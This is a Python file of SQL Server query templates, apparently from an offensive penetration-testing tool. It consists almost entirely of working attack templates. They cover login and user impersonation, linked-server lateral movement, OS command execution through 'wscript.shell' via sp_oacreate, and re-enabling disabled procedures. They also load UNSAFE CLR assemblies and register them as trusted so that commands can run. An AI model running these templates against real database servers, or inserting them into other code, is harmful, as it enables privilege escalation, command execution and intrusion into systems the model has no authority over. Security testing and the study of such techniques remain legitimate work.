# Impersonation and authentication queries
CAN_IMPERSONATE_AS_SERVER_PRINCIPAL = "SELECT b.name as username, a.permission_name as permission_name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id ;"
CAN_IMPERSONATE_AS_DATABASE_PRINCIPAL = "SELECT b.name as username, a.permission_name as permission_name FROM sys.database_permissions a INNER JOIN sys.database_principals b ON a.grantor_principal_id = b.principal_id;"
GET_USER_SERVER_ROLES = "SELECT p.name AS 'group' FROM sys.server_principals p JOIN sys.server_role_members m ON p.principal_id = m.role_principal_id WHERE m.member_principal_id = SUSER_ID();"
GET_USER_DATABASE_ROLES = "SELECT p.name AS 'group' FROM sys.database_principals p JOIN sys.database_role_members m ON p.principal_id = m.role_principal_id WHERE m.member_principal_id = SUSER_ID();"
IMPERSONATE_AS_SERVER_PRINCIPAL = "EXECUTE AS LOGIN = '{username}';"
IMPERSONATE_AS_DATABASE_PRINCIPAL = "EXECUTE AS USER = '{username}';"
REVERT_IMPERSONATION = "REVERT;"

# Lateral movement queries
GET_LINKABLE_SERVERS = "SELECT name, provider, is_remote_login_enabled, is_rpc_out_enabled FROM sys.servers WHERE is_linked = 1;"
OPENQUERY = "SELECT * FROM OPENQUERY(\"{linked_server}\", '{query}');"
EXEC_AT = "EXEC ('{query}') AT \"{linked_server}\";"
SP_OAMETHOD = "DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, '{command}';"
PROCEDURE_EXECUTION = "EXEC {procedure} '{command}';"
SET_SERVER_OPTION = "EXEC sp_serveroption '{link_name}','{feature}','{status}';"

# General queries
SERVER_INFORMATION = "SELECT @@SERVERNAME as hostname, DEFAULT_DOMAIN() as domain_name, @@VERSION as server_version, @@servicename as instance_name, USER_NAME() as db_user, SYSTEM_USER as server_user, DB_NAME() AS db_name;"
TRUSTWORTHY_DB_LIST = "SELECT name AS 'name' FROM sys.databases WHERE is_trustworthy_on = 1;"

# Permission checks
IS_UPDATE_SP_CONFIGURE_ALLOWED = "SELECT IIF(HAS_PERMS_BY_NAME('sp_configure', 'OBJECT', 'ALTER', SYSTEM_USER) = 1, 'True', 'False') AS [CanChangeConfiguration];"
IS_PROCEDURE_ACCESSIBLE = "SELECT CASE WHEN OBJECT_ID('{procedure}', 'X') IS NOT NULL THEN 'True' ELSE 'False' END AS [is_accessible];"
IS_PROCEDURE_ENABLED = "SELECT CASE WHEN (SELECT value_in_use FROM sys.configurations WHERE name = '{procedure}') = 1 THEN 'True' ELSE 'False' END AS [procedure];"

# Configuration queries
RECONFIGURE_PROCEDURE = "EXEC sp_configure '{procedure}', {status}; RECONFIGURE;"


# Custom assemblies queries
IS_ASSEMBLY_EXISTS = "SELECT CASE WHEN EXISTS (SELECT 1 FROM sys.assemblies WHERE name = '{asm_name}') THEN 'True' ELSE 'False' END as status;"
ADD_CUSTOM_ASM = "CREATE ASSEMBLY {asm_name} FROM {custom_asm} WITH PERMISSION_SET = UNSAFE;"
IS_PROCEDURE_EXISTS = "SELECT CASE WHEN OBJECT_ID('{procedure_name}') IS NOT NULL THEN 'True' ELSE 'False' END as status;"
CREATE_PROCEDURE = "CREATE PROCEDURE [dbo].[{procedure_name}] @{arg} NVARCHAR (4000) AS EXTERNAL NAME [{asm_name}].[StoredProcedures].[{procedure_name}];"
IS_FUNCTION_EXISTS = "SELECT CASE WHEN OBJECT_ID('{function_name}') IS NOT NULL THEN 'True' ELSE 'False' END as status;"
CREATE_FUNCTION = "CREATE FUNCTION [dbo].{function_name}({arg}) RETURNS NVARCHAR(MAX) AS EXTERNAL NAME {asm_name}.[{namespace}.{class_name}].{function_name};"
IS_MY_APP_TRUSTED = "SELECT CASE WHEN EXISTS (SELECT 1 FROM sys.trusted_assemblies WHERE hash = {my_hash}) THEN 'True' ELSE 'False' END AS [status];"
TRUST_MY_APP = "EXEC sp_add_trusted_assembly @hash = {my_hash}, @description = N'Trusted Assembly for My Application';"
UNTRUST_MY_APP = "EXEC sp_drop_trusted_assembly @hash = {my_hash};"
DROP_PROCEDURE = "DROP PROCEDURE {procedure_name};"
DROP_ASSEMBLY = "DROP ASSEMBLY {asm_name};"
DROP_FUNCTION = "DROP FUNCTION {function_name};"
FUNCTION_EXECUTION = "SELECT dbo.{function_name}({command});"
LDAP_QUERY = "SELECT * FROM 'LDAP://localhost:{port}' "


# For impersonation
EXEC_PREFIX = "EXEC('"
EXEC_SUFFIX = "');"